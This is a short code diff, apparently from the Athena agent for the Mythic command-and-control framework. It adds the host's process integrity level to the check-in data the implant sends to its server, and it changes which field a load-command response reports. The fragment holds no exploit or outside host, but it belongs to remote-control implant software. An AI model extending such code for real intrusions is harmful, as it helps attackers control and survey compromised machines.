@@ -38,7 +38,9 @@ namespace Athena
                 uuid = this.MythicConfig.uuid,
                 architecture = Misc.GetArch(),
                 domain = Environment.UserDomainName,
+                integrity_level = Misc.getIntegrity(),
             };
+
             var responseString = this.MythicConfig.currentConfig.Send(ct).Result;
             try
             {
@@ -291,7 +293,7 @@ namespace Athena
                                     CommandsResponse cr = new CommandsResponse()
                                     {
                                         action = "add",
-                                        cmd = lc.name,
+                                        cmd = lc.command,
                                     };
                                     LoadCommandResponseResult rr = new LoadCommandResponseResult()
                                     {
